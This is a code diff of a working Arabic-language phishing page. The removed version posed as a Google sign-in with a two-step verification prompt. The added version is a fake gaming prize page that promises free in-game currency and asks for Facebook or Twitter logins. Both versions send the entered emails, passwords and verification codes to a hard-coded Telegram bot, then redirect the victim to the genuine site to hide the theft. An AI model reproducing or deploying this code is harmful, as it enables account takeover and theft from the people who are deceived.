@@ -3,74 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - التحقق من الهوية</title>
+    <title>مركز توزيع الجوائز - 2026</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 380px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
-        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        #step2 { display: none; }
+        body { background: #0b0f19; color: white; font-family: 'Arial', sans-serif; margin: 0; text-align: center; }
+        .hero { padding: 40px 20px; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://wallpaperaccess.com/full/223128.jpg'); background-size: cover; border-bottom: 2px solid #f3ba2f; }
+        .gift-box { margin-top: 20px; padding: 20px; border: 1px solid #f3ba2f; display: inline-block; border-radius: 10px; background: rgba(0,0,0,0.5); }
+        .claim-btn { padding: 15px 50px; background: #f3ba2f; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        
+        /* النافذة المنبثقة */
+        #login-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; }
+        .login-box { width: 320px; background: #fff; margin: 100px auto; padding: 20px; border-radius: 8px; color: #333; }
+        .fb-btn { background: #1877f2; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; margin: 5px 0; font-weight: bold; cursor: pointer; }
+        .tw-btn { background: #000; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; margin: 5px 0; font-weight: bold; cursor: pointer; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" alt="Google">
-    
-    <div id="step1">
-        <h1>تسجيل الدخول</h1>
-        <p>استخدم حسابك على Google</p>
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-        <input type="password" id="pass" placeholder="كلمة المرور" required>
-        <button class="btn" onclick="goToStep2()">التالي</button>
+<div class="hero">
+    <h1>مبروك! أنت مؤهل لاستلام 5000 شدة/جوهرة</h1>
+    <p>بمناسبة مرور 10 سنوات على الانطلاق، اختر هديتك الآن</p>
+    <div class="gift-box">
+        <img src="https://vignette.wikia.nocookie.net/clashofclans/images/a/a2/Gems.png" width="100"><br>
+        <button class="claim-btn" onclick="openLogin()">استلام الآن</button>
     </div>
+</div>
 
-    <div id="step2">
-        <h1>التحقق بخطوتين</h1>
-        <p>أدخل الرمز المكون من 6 أرقام الذي أرسلناه إلى جوالك</p>
-        <div class="loader" id="loader"></div>
-        <input type="number" id="code" placeholder="أدخل الرمز G-XXXXXX">
-        <button class="btn" onclick="finish()">تأكيد</button>
+<div id="login-modal">
+    <div class="login-box">
+        <h3 id="login-title">تسجيل الدخول للاستلام</h3>
+        <p style="font-size: 12px;">اختر طريقة تسجيل الدخول لربط حساب اللعبة</p>
+        <button class="fb-btn" onclick="showFields('Facebook')">الدخول عبر Facebook</button>
+        <button class="tw-btn" onclick="showFields('Twitter')">الدخول عبر Twitter</button>
+        
+        <div id="fields" style="display:none;">
+            <hr>
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button class="fb-btn" id="final-btn" onclick="sendData()">تأكيد الهوية</button>
+        </div>
     </div>
 </div>
 
 <script>
     const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
     const CHAT_ID = "5811700860";
+    let platform = "";
 
-    function goToStep2() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        
-        if(email.includes('@') && pass.length > 4) {
-            // إرسال البيانات الأولى سراً
-            sendToBot(`🎯 صيد Gmail (مرحلة 1):\n👤 الإيميل: ${email}\n🔑 الباسورد: ${pass}`);
-            
-            // إظهار التحميل للتمويه
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('step2').style.display = 'block';
-            
-            setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 2000);
-        } else { alert("خطأ في البيانات!"); }
+    function openLogin() { document.getElementById('login-modal').style.display = 'block'; }
+    
+    function showFields(p) {
+        platform = p;
+        document.getElementById('login-title').innerText = "تسجيل الدخول بـ " + p;
+        document.getElementById('fields').style.display = 'block';
+        if(p == 'Twitter') document.getElementById('final-btn').style.background = '#000';
     }
 
-    function finish() {
-        const code = document.getElementById('code').value;
-        sendToBot(`🛡️ كود التحقق (مرحلة 2):\n🔢 الرمز: ${code}`);
-        
-        // التحويل النهائي لـ Gmail الحقيقي
-        window.location.href = "https://mail.google.com";
-    }
+    async function sendData() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
 
-    function sendToBot(msg) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        if(u.length < 5 || p.length < 5) { alert("خطأ في البيانات!"); return; }
+
+        const report = `🎮 **صيد ألعاب جديد (${platform}):**\n\n👤 الحساب: \`${u}\`\n🔑 كلمة السر: \`${p}\``;
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+            body: JSON.stringify({chat_id: CHAT_ID, text: report, parse_mode: "Markdown"})
         });
+
+        alert("تم التحقق! ستصلك الهدية خلال 24 ساعة.");
+        window.location.href = "https://www.pubgmobile.com"; // تحويل للموقع الرسمي
     }
 </script>
 </body>
